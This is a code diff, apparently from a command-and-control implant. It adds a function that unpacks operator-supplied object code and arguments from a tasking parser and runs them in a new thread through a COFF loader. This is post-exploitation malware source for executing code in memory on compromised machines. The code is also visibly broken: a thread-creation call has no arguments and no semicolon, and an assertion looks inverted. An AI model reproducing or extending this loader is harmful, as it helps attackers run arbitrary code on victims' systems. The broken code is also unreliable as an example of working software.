@@ -402,11 +402,31 @@ namespace Objects {
     VOID CoffThread(_coff_params *params) {
 
         x_assert(!params->entrypoint || !params->data);
+        CoffLoader(params->entrypoint, params->data, params->args, params->args_size, params->task_id);
 
         defer:
-        x_zerofree(params->entrypoint, params->entrypoint_length);
-        x_zerofree(params->data, params->data_length);
+        x_zerofree(params->entrypoint, params->entrypoint_size);
+        x_zerofree(params->data, params->data_size);
         x_zerofree(params->args, params->args_size);
         x_zerofree(params, sizeof(_coff_params));
+    }
+
+    VOID LoadObject(_parser* parser) {
+
+        HANDLE          thread  = { };
+        _coff_params    *params = { };
+        _injection_ctx  inject  = { };
+
+        params = (_coff_params*) x_malloc(sizeof(_coff_params));
+
+        params->entrypoint  = Parser::UnpackString(parser, (uint32_t*)&params->entrypoint_size);
+        params->data        = Parser::UnpackBytes(parser, (uint32_t*)&params->data_size);
+        params->args        = Parser::UnpackBytes(parser, (uint32_t*)&params->args_size);
+        params->task_id     = Ctx->session.current_taskid;
+
+        inject.parameter = params;
+        Ctx->threads++;
+
+        x_assert(CreateUserThread())
     }
 }
